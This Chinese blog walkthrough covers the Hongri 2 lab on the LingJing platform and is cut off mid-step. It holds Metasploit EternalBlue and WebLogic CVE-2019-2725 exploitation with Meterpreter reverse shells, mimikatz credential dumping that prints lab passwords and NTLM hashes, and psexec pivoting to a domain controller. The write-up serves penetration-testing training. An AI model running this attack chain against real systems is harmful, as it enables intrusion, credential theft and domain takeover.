---
title: 红日2靶场（灵境平台）
date: 2026-03-12
categories:
  - 红日靶场
tags:
  - 渗透靶场
---



# 环境搭建：

[LingJing(灵境)](https://github.com/414aaj/LingJing)

关于网络环境搭建可以看官方文档：

[LingJing（灵境）外部虚拟机联动](https://blog.csdn.net/2403_88183381/article/details/155192353)

[LingJing(灵境)桌面网络安全靶场平台网络拓扑](https://blog.csdn.net/2403_88183381/article/details/155322674)





<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151704738.png)

靶机 IP1：192.168.242.49

靶机 IP2：192.168.242.226



# 信息收集
## 扫描开放端口：
```bash
nmap -Pn 192.168.242.49
nmap -Pn 192.168.242.226
```

```bash
┌──(xvsf㉿kali)-[~]
└─$ nmap -Pn 192.168.242.49
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-10 01:14 -0400
Nmap scan report for 192.168.242.49
Host is up (0.0022s latency).
Not shown: 992 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 9.42 seconds

┌──(xvsf㉿kali)-[~]
└─$ nmap -Pn 192.168.242.226
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-10 01:15 -0400
Nmap scan report for 192.168.242.226
Host is up (0.0024s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
3389/tcp  open  ms-wbt-server
7001/tcp  open  afs3-callback
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 15.86 seconds
```



## 扫描445端口漏洞
```bash
sudo nmap -p 445 192.168.242.49 -Pn --script smb-vuln*
sudo nmap -p 445 192.168.242.226 -Pn --script smb-vuln*
```

都存在漏洞：CVE-2017-0143

```bash
┌──(xvsf㉿kali)-[~]
└─$ sudo nmap -p 445 192.168.242.49 -Pn --script smb-vuln*
[sudo] xvsf 的密码：
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-10 01:16 -0400
Nmap scan report for 192.168.242.49
Host is up (0.0028s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 16.37 seconds

┌──(xvsf㉿kali)-[~]
└─$ sudo nmap -p 445 192.168.242.226 -Pn --script smb-vuln*
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-10 01:24 -0400
Stats: 0:00:02 elapsed; 0 hosts completed (0 up), 0 undergoing Host Discovery
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Nmap scan report for 192.168.242.226
Host is up (0.019s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

Nmap done: 1 IP address (1 host up) scanned in 16.37 seconds
```



### <font style="color:rgb(77, 77, 77);">msf 进行利用</font>
```bash
msfconsole
 
use exploit/windows/smb/ms17_010_eternalblue
 
set RHOSTS 192.168.242.49
 
set LHOST 192.168.188.104
 
run
```





```bash
┌──(xvsf㉿kali)-[~]
└─$ msfconsole
Metasploit tip: Start commands with a space to avoid saving them to history

 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v6.4.112-dev                               ]
+ -- --=[ 2,607 exploits - 1,325 auxiliary - 1,710 payloads     ]
+ -- --=[ 430 post - 49 encoders - 14 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.242.49
RHOSTS => 192.168.242.49
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.188.104
LHOST => 192.168.188.104
msf exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 192.168.188.104:4444
[*] 192.168.242.49:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.242.49:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x86 (32-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.25/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 192.168.242.49:445    - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.242.49:445 - The target is vulnerable.
[-] 192.168.242.49:445 - Exploit aborted due to failure: no-target: This module only supports x64 (64-bit) targets
[*] Exploit completed, but no session was created.

msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.242.226
RHOSTS => 192.168.242.226
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.188.104
LHOST => 192.168.188.104
msf exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 192.168.188.104:4444
[*] 192.168.242.226:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.242.226:445   - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.242.226:445   - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.242.226:445 - The target is vulnerable.
[*] 192.168.242.226:445 - Connecting to target for exploitation.
[+] 192.168.242.226:445 - Connection established for exploitation.
[+] 192.168.242.226:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.242.226:445 - CORE raw buffer dump (51 bytes)
[*] 192.168.242.226:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 192.168.242.226:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard
[*] 192.168.242.226:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
[*] 192.168.242.226:445 - 0x00000030  6b 20 31                                         k 1
[+] 192.168.242.226:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.242.226:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.242.226:445 - Sending all but last fragment of exploit packet
[*] 192.168.242.226:445 - Starting non-paged pool grooming
[+] 192.168.242.226:445 - Sending SMBv2 buffers
[+] 192.168.242.226:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.242.226:445 - Sending final SMBv2 buffers.
[*] 192.168.242.226:445 - Sending last fragment of exploit packet!
[*] 192.168.242.226:445 - Receiving response from exploit packet
[+] 192.168.242.226:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.242.226:445 - Sending egg to corrupted connection.
[*] 192.168.242.226:445 - Triggering free of corrupted buffer.
[*] Sending stage (232006 bytes) to 192.168.242.226
[*] Meterpreter session 1 opened (192.168.188.104:4444 -> 192.168.242.226:49489) at 2026-03-10 01:28:14 -0400
[+] 192.168.242.226:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.242.226:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.242.226:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : WEB
OS              : Windows Server 2008 R2 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : zh_CN
Domain          : DE1AY
Logged On Users : 8
Meterpreter     : x64/windows
meterpreter >
```



<font style="color:rgb(77, 77, 77);">拿下靶机 2 - 192.168.242.226 且是最高权限</font>

<font style="color:rgb(77, 77, 77);">但是靶机 1 打不进</font>

### <font style="color:rgb(79, 79, 79);">对靶机 2 的 7001 端口进行漏洞检测</font>




<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151704454.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151704354.png)





```bash

http://192.168.242.226:7001/存在漏洞！--2026-03-10 01:33:00

当前应用目录：<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Draft//EN">
<HTML>
<HEAD>
<TITLE>Error 404--Not Found</TITLE>
</HEAD>
<BODY bgcolor="white">
<FONT FACE=Helvetica><BR CLEAR=all>
<TABLE border=0 cellspacing=5><TR><TD><BR CLEAR=all>
<FONT FACE="Helvetica" COLOR="black" SIZE="3"><H2>Error 404--Not Found</H2>
</FONT></TD></TR>
</TABLE>
<TABLE border=0 width=100% cellpadding=10><TR><TD VALIGN=top WIDTH=100% BGCOLOR=white><FONT FACE="Courier New"><FONT FACE="Helvetica" SIZE="3"><H3>From RFC 2068 <i>Hypertext Transfer Protocol -- HTTP/1.1</i>:</H3>
</FONT><FONT FACE="Helvetica" SIZE="3"><H4>10.4.5 404 Not Found</H4>
</FONT><P><FONT FACE="Courier New">The server has not found anything matching the Request-URI. No indication is given of whether the condition is temporary or permanent.</p><p>If the server does not wish to make this information available to the client, the status code 403 (Forbidden) can be used instead. The 410 (Gone) status code SHOULD be used if the server knows, through some internally configurable mechanism, that an old resource is permanently unavailable and has no forwarding address.</FONT></P>
</FONT></TD></TR>
</TABLE>

</BODY>
</HTML>
--2026-03-10 01:33:02

http://192.168.242.226:7001/存在漏洞！--2026-03-10 01:33:21

当前应用目录：C:/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/--2026-03-10 01:33:23

```





### 靶机 2 利用 CVE-2019-2725
> [https://blog.csdn.net/2301_78519654/article/details/156948020](https://blog.csdn.net/2301_78519654/article/details/156948020)
>
> <font style="color:rgb(254, 44, 36);">这里有个细节在use 2命令后它默认的payload是32位的但是我们前面的看到的是64位的，如果直接用32位的话会导致后面提取不了凭证</font>
>
> <font style="color:rgb(77, 77, 77);">需要多run几次才能拿到会话，如果靶机挂了很久才开始打的话则一次就能获得</font>
>



```bash
┌──(xvsf㉿kali)-[~]
└─$ msfconsole
Metasploit tip: Use post/multi/manage/autoroute to automatically add
pivot routes

IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v6.4.112-dev                               ]
+ -- --=[ 2,607 exploits - 1,325 auxiliary - 1,710 payloads     ]
+ -- --=[ 430 post - 49 encoders - 14 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > search cve-2019-2725

Matching Modules
================

   #  Name                                                          Disclosure Date  Rank       Check  Description
   -  ----                                                          ---------------  ----       -----  -----------
   0  exploit/multi/misc/weblogic_deserialize_asyncresponseservice  2019-04-23       excellent  Yes    Oracle Weblogic Server Deserialization RCE - AsyncResponseService
   1    \_ target: Unix                                             .                .          .      .
   2    \_ target: Windows                                          .                .          .      .
   3    \_ target: Solaris                                          .                .          .      .


Interact with a module by name or index. For example info 3, use 3 or use exploit/multi/misc/weblogic_deserialize_asyncresponseservice
After interacting with a module you can manually set a TARGET with set TARGET 'Solaris'

msf > use 2
[*] Additionally setting TARGET => Windows
[*] Using configured payload windows/meterpreter/reverse_tcp
msf exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > set RHOST 192.168.242.226
RHOST => 192.168.242.226
msf exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > set LHOST 192.168.188.104
LHOST => 192.168.188.104
msf exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > set LPORT 3333
LPORT => 3333
msf exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > run
[*] Started reverse TCP handler on 192.168.188.104:3333
[*] Generating payload...
[*] Sending payload...
[*] Exploit completed, but no session was created.
msf exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > run
[*] Started reverse TCP handler on 192.168.188.104:3333
[*] Generating payload...
[*] Sending payload...
[*] Exploit completed, but no session was created.
msf exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > run
[*] Started reverse TCP handler on 192.168.188.104:3333
[*] Generating payload...
[*] Sending payload...
[*] Exploit completed, but no session was created.
msf exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > run
[*] Started reverse TCP handler on 192.168.188.104:3333
[*] Generating payload...
[*] Sending payload...
[*] Sending stage (232006 bytes) to 192.168.242.226
[*] Meterpreter session 1 opened (192.168.188.104:3333 -> 192.168.242.226:49502) at 2026-03-10 01:43:15 -0400

meterpreter >
```





#### 提权：
```bash
meterpreter > getuid
Server username: DE1AY\administrator
meterpreter > sysinfo
Computer        : WEB
OS              : Windows Server 2008 R2 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : zh_CN
Domain          : DE1AY
Logged On Users : 8
Meterpreter     : x64/windows
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```



#### <font style="color:rgb(79, 79, 79);">加载凭证抓取模块并抓取凭证</font>


```bash
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain  LM                              NTLM                            SHA1
--------       ------  --                              ----                            ----
Administrator  DE1AY   020e3fc4eff5c9d61d91a081d4b378  cf83cd7efde13e0ce754874aaa979a  a2dc253087c47bce0db3f5931635212
                       61                              74                              dbfdb9e77
WEB$           DE1AY                                   2e8c54f1bc3332785e163b4240c821  d9845a21597c81d51dfec8a10daeeef
                                                       39                              224f74305
de1ay          DE1AY   f67ce55ac831223dc187b8085fe1d9  161cff084477fe596a5db81874498a  d669f3bccf14bf77d64667ec65aae32
                       df                              24                              d2d10039d
mssql          DE1AY   f67ce55ac831223dc187b8085fe1d9  161cff084477fe596a5db81874498a  d669f3bccf14bf77d64667ec65aae32
                       df                              24                              d2d10039d

wdigest credentials
===================

Username       Domain  Password
--------       ------  --------
(null)         (null)  (null)
Administrator  DE1AY   2wsx!QAZ
WEB$           DE1AY   Bm6wd=L6t;KbeX"Een0`Q+sQ"x5Zc>?<8+TW("`@ZkfLc2mI"f)rF/dwLe[b>hF5ND]?dUl10hYqEx@v+XKlyo$fotzz5`w
                       [J3Nl`46?!%Es%&..xPF;99UU
de1ay          DE1AY   1qaz@WSX
mssql          DE1AY   1qaz@WSX

tspkg credentials
=================

Username       Domain  Password
--------       ------  --------
Administrator  DE1AY   2wsx!QAZ
WEB$           DE1AY   Bm6wd=L6t;KbeX"Een0`Q+sQ"x5Zc>?<8+TW("`@ZkfLc2mI"f)rF/dwLe[b>hF5ND]?dUl10hYqEx@v+XKlyo$fotzz5`w
                       [J3Nl`46?!%Es%&..xPF;99UU
de1ay          DE1AY   1qaz@WSX
mssql          DE1AY   1qaz@WSX

kerberos credentials
====================

Username       Domain     Password
--------       ------     --------
(null)         (null)     (null)
WEB$           de1ay.com  Bm6wd=L6t;KbeX"Een0`Q+sQ"x5Zc>?<8+TW("`@ZkfLc2mI"f)rF/dwLe[b>hF5ND]?dUl10hYqEx@v+XKlyo$fotzz
                          5`w[J3Nl`46?!%Es%&..xPF;99UU
administrator  DE1AY.COM  2wsx!QAZ
de1ay          DE1AY.COM  1qaz@WSX
mssql          DE1AY.COM  1qaz@WSX
web$           DE1AY.COM  Bm6wd=L6t;KbeX"Een0`Q+sQ"x5Zc>?<8+TW("`@ZkfLc2mI"f)rF/dwLe[b>hF5ND]?dUl10hYqEx@v+XKlyo$fotzz
                          5`w[J3Nl`46?!%Es%&..xPF;99UU


meterpreter >
```



#### 获得信息


##### msv credentials —— Windows 本地认证缓存 （看 NTLM Hash（用来做 Pass-the-Hash））
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151704742.png)

##### wdigest credentials —— 早期 HTTP 摘要认证模块（直接有明文密码（Win2012以下默认开启））
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151704858.png)

##### tspkg credentials —— 远程桌面（RDP）凭证缓存（也是明文密码，和 wdigest 内容通常一样）
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151704358.png)

##### kerberos credentials —— 域认证（Kerberos）缓存(明文密码 + 域名信息)
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151704872.png)

##### 明文密码
Administrator  DE1AY   2wsx!QAZ			域管密码

de1ay          DE1AY.COM  1qaz@WSX		域用户

mssql          DE1AY.COM  1qaz@WSX		数据库账户，密码和de1ay一样

##### 看 msv 里的 Hash
当抓不到明文密码时（Win2012R2+ 默认关闭 wdigest），就只能靠 Hash：

  Administrator  NTLM: cf83cd7efde13e0ce754874aaa979a74

  de1ay          NTLM: 161cff084477fe596a5db81874498a24

  mssql          NTLM: 161cff084477fe596a5db81874498a24



#### 通过 3389 端口登录靶机 2
之前端口扫描中发现靶机 2 开放了 3389 端口，可以进行远程登录



##### Kali:
`rdesktop -u Administrator -p '2wsx!QAZ' -d DE1AY 192.168.242.226`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151704541.png)



我这里没有安装 xfreerdp ，所以还是使用 rdesktop

```bash
解决：改本地密码（去掉 /domain）

  在 Meterpreter shell 里：

  net user Administrator 2wsx!QAZ123

  不加 /domain 就是改本机的本地管理员密码，不需要域控在线。

  然后用本地账户 RDP（不指定域）：

  rdesktop -u Administrator -p '2wsx!QAZ123' 192.168.242.226
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151704897.png)





##### Windows:
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151704263.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151704535.png)

提示输入密码：2wsx!QAZ



也有可能如下图所示，密码或用户名错误，

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151704855.png)



这个时候按照

用户名：Administrator

密码：2wsx!QAZ

一般是可以进入的，如果提示密码过期，可以更改密码



<font style="color:rgb(77, 77, 77);">成功以管理员登陆靶机2</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151704564.png)



### 收集域内信息


```bash
meterpreter > ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 12
============
Name         : Microsoft ISATAP Adapter
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::5efe:c0a8:f2e2
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 14
============
Name         : Microsoft ISATAP Adapter #2
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::5efe:a0a:a50
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 15
============
Name         : Intel(R) PRO/1000 MT Network Connection #3
Hardware MAC : 52:54:00:41:4a:41
MTU          : 1500
IPv4 Address : 192.168.242.226
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::60bd:1304:c325:7dc1
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface 16
============
Name         : Intel(R) PRO/1000 MT Network Connection #4
Hardware MAC : 52:54:00:41:4a:42
MTU          : 1500
IPv4 Address : 10.10.10.80
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::f057:c033:ded:ac5a
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface 17
============
Name         : Intel(R) PRO/1000 MT Network Connection #5
Hardware MAC : 52:54:00:41:4a:43
MTU          : 1500
IPv4 Address : 10.0.2.15
IPv4 Netmask : 255.255.255.0
IPv6 Address : fec0::188d:8d27:db9:103e
IPv6 Netmask : ffff:ffff:ffff:ffff::
IPv6 Address : fe80::188d:8d27:db9:103e
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface 18
============
Name         : Microsoft ISATAP Adapter #3
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::5efe:a00:20f
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff

meterpreter >
```





看到除了外网 IP：192.168.242.226

还有一个内网 IP：10.10.10.80



<font style="color:rgb(77, 77, 77);">根据之前获取到的凭证得到完整的位 </font>`<font style="color:rgb(77, 77, 77);">DE1AY.COM</font>`<font style="color:rgb(77, 77, 77);"> 通过 </font>`<font style="color:rgb(77, 77, 77);">ping</font>`<font style="color:rgb(77, 77, 77);"> 即可确认域控 </font>`<font style="color:rgb(77, 77, 77);">ip</font>`

<font style="color:rgb(77, 77, 77);">确认了，域控 IP 就是 10.10.10.10</font>

```bash
meterpreter > shell
Process 4696 created.
Channel 2 created.
Microsoft Windows [�汾 6.1.7601]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����

C:\Windows\system32>ping DE1AY.COM
ping DE1AY.COM

���� Ping DE1AY.COM [10.10.10.10] ���� 32 �ֽڵ�����:
���� 10.10.10.10 �Ļظ�: �ֽ�=32 ʱ��=2ms TTL=128
���� 10.10.10.10 �Ļظ�: �ֽ�=32 ʱ��=2ms TTL=128
���� 10.10.10.10 �Ļظ�: �ֽ�=32 ʱ��=1ms TTL=128
���� 10.10.10.10 �Ļظ�: �ֽ�=32 ʱ��=1ms TTL=128

10.10.10.10 �� Ping ͳ����Ϣ:
    ���ݰ�: �ѷ��� = 4���ѽ��� = 4����ʧ = 0 (0% ��ʧ)��
�����г̵Ĺ���ʱ��(�Ժ���Ϊ��λ):
    ��� = 1ms��� = 2ms��ƽ�� = 1ms

C:\Windows\system32>
```



已经有域管密码 Administrator / 2wsx!QAZ，可以直接横向拿域控



### 横向移动到域控


```bash
meterpreter > background
[*] Backgrounding session 1...
msf exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > use post/multi/manage/autoroute
msf post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf post(multi/manage/autoroute) > set SUBNET 10.10.10.0
SUBNET => 10.10.10.0
msf post(multi/manage/autoroute) > run
[*] Running module against WEB (192.168.242.226)
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.0.2.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 10.10.10.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 192.168.242.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
msf post(multi/manage/autoroute) > use exploit/windows/smb/psexec
[*] Using configured payload windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf exploit(windows/smb/psexec) > set RHOSTS 10.10.10.10
RHOSTS => 10.10.10.10
msf exploit(windows/smb/psexec) > set SMBDomain DE1AY
SMBDomain => DE1AY
msf exploit(windows/smb/psexec) > set SMBUser Administrator
SMBUser => Administrator
msf exploit(windows/smb/psexec) > run
[*] 10.10.10.10:445 - Connecting to the server...
[*] 10.10.10.10:445 - Authenticating to 10.10.10.10:445|DE1AY as user 'Administrator'...
[*] 10.10.10.10:445 - Selecting PowerShell target
[*] 10.10.10.10:445 - Executing the payload...
[+] 10.10.10.10:445 - Service start timed out, OK if running a command or non-service executable...
[*] Started bind TCP handler against 10.10.10.10:4444
[*] Exploit completed, but no session was created.
msf exploit(windows/smb/psexec) >
msf exploit(windows/smb/psexec) > set SMBPass 2wsx!QAZ
SMBPass => 2wsx!QAZ
msf exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf exploit(windows/smb/psexec) > set LPORT 4444
LPORT => 4444
msf exploit(windows/smb/psexec) > run
[*] 10.10.10.10:445 - Connecting to the server...
[*] 10.10.10.10:445 - Authenticating to 10.10.10.10:445|DE1AY as user 'Administrator'...
[*] 10.10.10.10:445 - Selecting PowerShell target
[*] 10.10.10.10:445 - Executing the payload...
[+] 10.10.10.10:445 - Service start timed out, OK if running a command or non-service executable...
[*] Started bind TCP handler against 10.10.10.10:4444
[*] Exploit completed, but no session was created.
msf exploit(windows/smb/psexec) >
```



能访问域控的 C 盘。现在可以通过计划任务在域控上拿 shell

```bash
msf exploit(windows/smb/psexec) > sessions 1
[*] Starting interaction with 1...

meterpreter > shell
Process 328 created.
Channel 5 created.
Microsoft Windows [�汾 6.1.7601]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����

C:\Windows\system32>net use \\10.10.10.10\c$ "2wsx!QAZ" /user:DE1AY\Administrator
net use \\10.10.10.10\c$ "2wsx!QAZ" /user:DE1AY\Administrator
����ɹ���ɡ�


C:\Windows\system32>dir \\10.10.10.10\c$
dir \\10.10.10.10\c$
 ������ \\10.10.10.10\c$ �еľ�û�б�ǩ��
 ������к��� 92FD-8733

 \\10.10.10.10\c$ ��Ŀ¼

2019/09/08  18:57    <DIR>          101cde781c961a208b
2013/08/22  23:52    <DIR>          PerfLogs
2013/08/22  22:50    <DIR>          Program Files
2013/08/22  23:39    <DIR>          Program Files (x86)
2019/09/09  10:47    <DIR>          Users
2019/09/09  10:43    <DIR>          Windows
               0 ���ļ�              0 �ֽ�
               6 ��Ŀ¼ 54,907,113,472 �����ֽ�

C:\Windows\system32>exit
exit
meterpreter > background
[*] Backgrounding session 1...
msf exploit(windows/smb/psexec) > use exploit/windows/smb/psexec
[*] Using configured payload windows/x64/meterpreter/bind_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf exploit(windows/smb/psexec) > set RHOSTS 10.10.10.10
RHOSTS => 10.10.10.10
msf exploit(windows/smb/psexec) >  set SMBDomain DE1AY
SMBDomain => DE1AY
msf exploit(windows/smb/psexec) > set SMBUser Administrator
SMBUser => Administrator
msf exploit(windows/smb/psexec) > set SMBPass 2wsx!QAZ
SMBPass => 2wsx!QAZ
msf exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf exploit(windows/smb/psexec) > set RPORT 445
RPORT => 445
msf exploit(windows/smb/psexec) > set LPORT 4445
LPORT => 4445
msf exploit(windows/smb/psexec) > run
[*] 10.10.10.10:445 - Connecting to the server...
[*] 10.10.10.10:445 - Authenticating to 10.10.10.10:445|DE1AY as user 'Administrator'...
